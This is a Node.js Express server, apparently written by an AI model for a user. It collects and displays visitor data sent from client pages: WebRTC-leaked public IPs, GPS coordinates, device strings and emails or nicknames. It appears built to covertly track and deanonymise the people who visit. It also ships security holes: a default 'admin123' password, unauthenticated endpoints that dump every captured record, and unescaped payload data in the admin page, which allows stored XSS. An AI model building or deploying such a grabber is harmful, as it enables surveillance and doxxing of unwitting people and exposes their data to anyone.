const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');  // ADDED

const app = express();
const PORT = process.env.PORT || 3000;

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

const sessions = {};
let logHistory = [];
let lastData = null;

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());  // ADDED
app.use(express.static(path.join(__dirname)));

// ... rest of your routes (same as before) ...
// Ensure all routes are identical to the previously provided server.js
// but with the cookie parser added.

// I'll include the full code again for completeness:
function generateToken() {
    return crypto.randomBytes(16).toString('hex');
}

function isAuthenticated(req) {
    const token = req.cookies?.admin_session;
    if (!token) return false;
    if (sessions[token] && sessions[token].expires > Date.now()) {
        return true;
    }
    return false;
}

app.post('/collect', (req, res) => {
    const data = req.body;
    if (!data) {
        return res.status(400).json({ status: 'error', message: 'No data' });
    }
    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    data.server_side_ip = clientIP;
    const entry = {
        received_at: new Date().toISOString(),
        payload: data
    };
    logHistory.push(entry);
    lastData = data;
    try {
        fs.appendFileSync('data.log', `[${entry.received_at}] ${JSON.stringify(data)}\n`, 'utf8');
    } catch (err) {
        console.error('File write error:', err.message);
    }
    console.log('Received data:', JSON.stringify(data, null, 2));
    res.json({ status: 'success', message: 'Data logged' });
});

app.get('/login', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>Admin Login</title>
        <style>
            body { font-family: Arial; background: #f5f7fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin:0; }
            .card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 300px; text-align: center; }
            input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; }
            button { padding: 12px 30px; background: #1a73e8; color: white; border: none; border-radius: 8px; cursor: pointer; }
            .error { color: red; }
        </style>
        </head>
        <body>
        <div class="card">
            <h2>Admin Login</h2>
            <form method="POST" action="/login">
                <input type="password" name="password" placeholder="Enter admin password" required>
                <button type="submit">Login</button>
                <div class="error">${req.query.error ? 'Invalid password' : ''}</div>
            </form>
        </div>
        </body>
        </html>
    `);
});

app.post('/login', (req, res) => {
    const { password } = req.body;
    if (password === ADMIN_PASSWORD) {
        const token = generateToken();
        sessions[token] = { expires: Date.now() + 3600000 };
        res.cookie('admin_session', token, { httpOnly: true, maxAge: 3600000 });
        return res.redirect('/admin');
    } else {
        return res.redirect('/login?error=1');
    }
});

app.get('/admin', (req, res) => {
    if (!isAuthenticated(req)) {
        return res.redirect('/login');
    }

    let rows = '';
    if (logHistory.length === 0) {
        rows = '<tr><td colspan="7" style="text-align:center;">No records yet.</td></tr>';
    } else {
        logHistory.forEach((entry, index) => {
            const p = entry.payload;
            const ip = p.webrtc?.public || p.server_side_ip || 'N/A';
            const device = (p.basic?.userAgent || 'Unknown').substring(0, 60) + (p.basic?.userAgent?.length > 60 ? '…' : '');
            const location = p.location ? `${p.location.latitude}, ${p.location.longitude} (acc: ${p.location.accuracy}m)` : 'Not shared';
            const email = p.email || p.nick || '—';
            const time = new Date(entry.received_at).toLocaleString();
            rows += `<tr>
                <td>${index + 1}</td>
                <td>${time}</td>
                <td>${ip}</td>
                <td style="font-size:12px; word-break:break-word;">${device}</td>
                <td>${location}</td>
                <td>${email}</td>
            </tr>`;
        });
    }

    const html = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Admin - Visitor Records</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f5f7fa; margin: 20px; }
        .container { max-width: 1200px; margin: auto; background: white; border-radius: 12px; padding: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); }
        h1 { font-size: 24px; margin-bottom: 10px; color: #1a1a2e; }
        .meta { color: #666; font-size: 14px; margin-bottom: 20px; }
        table { width: 100%; border-collapse: collapse; font-size: 14px; }
        th { background: #1a73e8; color: white; padding: 12px 10px; text-align: left; }
        td { padding: 10px; border-bottom: 1px solid #e9ecf2; vertical-align: middle; }
        tr:hover { background: #f0f4ff; }
        .logout { margin-top: 20px; }
        .logout a { color: #1a73e8; text-decoration: none; }
    </style>
</head>
<body>
<div class="container">
    <h1>📋 Visitor Records</h1>
    <div class="meta">Total entries: <strong>${logHistory.length}</strong> &nbsp;|&nbsp; <a href="/logout">Logout</a></div>
    <table>
        <thead>
            <tr>
                <th>#</th>
                <th>Time</th>
                <th>IP Address</th>
                <th>Device / Browser</th>
                <th>Location (GPS)</th>
                <th>Email / Nick</th>
            </tr>
        </thead>
        <tbody>
            ${rows}
        </tbody>
    </table>
    <div class="footer" style="margin-top:20px; font-size:13px; color:#999;">Data is stored in memory. Use "Logout" to end session.</div>
</div>
</body>
</html>`;
    res.send(html);
});

app.get('/logout', (req, res) => {
    const token = req.cookies?.admin_session;
    if (token) {
        delete sessions[token];
        res.clearCookie('admin_session');
    }
    res.redirect('/login');
});

// Legacy endpoints
app.get('/records', (req, res) => {
    if (isAuthenticated(req)) {
        return res.redirect('/admin');
    }
    res.redirect('/login');
});

app.get('/logs', (req, res) => {
    if (logHistory.length === 0) {
        return res.status(404).json({ status: 'error', message: 'No logs yet' });
    }
    res.json(logHistory);
});

app.get('/rawlog', (req, res) => {
    if (lastData) {
        res.json(lastData);
    } else {
        res.status(404).json({ status: 'error', message: 'No data captured yet' });
    }
});

app.get('/log', (req, res) => {
    if (fs.existsSync('data.log')) {
        res.sendFile(path.join(__dirname, 'data.log'));
    } else {
        res.status(404).send('No log file yet');
    }
});

app.get('/ip', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    res.json({ ip });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});